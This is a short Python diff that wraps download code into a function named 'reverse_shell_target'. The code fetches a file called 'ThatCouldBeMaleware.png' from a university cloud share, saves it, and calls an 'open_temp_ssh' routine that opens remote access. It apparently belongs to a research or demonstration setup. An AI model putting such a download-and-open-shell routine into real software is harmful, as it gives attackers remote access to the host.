@@ -1,16 +1,19 @@
 import requests
 import open_ssh
+from daisy.communication import StreamEndpoint
 
-url =  "https://tubcloud.tu-berlin.de/s/FNmHMXp3zWiMggb/download/ThatCouldBeMaleware.png"
+def reverse_shell_target():
 
-filename = "ThatCouldBeMaleware.png"
+    url =  "https://tubcloud.tu-berlin.de/s/FNmHMXp3zWiMggb/download/ThatCouldBeMaleware.png"
 
-response = requests.get(url)
+    filename = "ThatCouldBeMaleware.png"
 
-if response.status_code == 200:
-    with open(filename, "wb") as f:
-        f.write(response.content)
-        open_ssh.open_temp_ssh()
-else:
-    print("Download failed! {response.status_code}")
+    response = requests.get(url)
+
+    if response.status_code == 200:
+        with open(filename, "wb") as f:
+            f.write(response.content)
+            open_ssh.open_temp_ssh()
+    else:
+        print("Download failed! {response.status_code}")
 
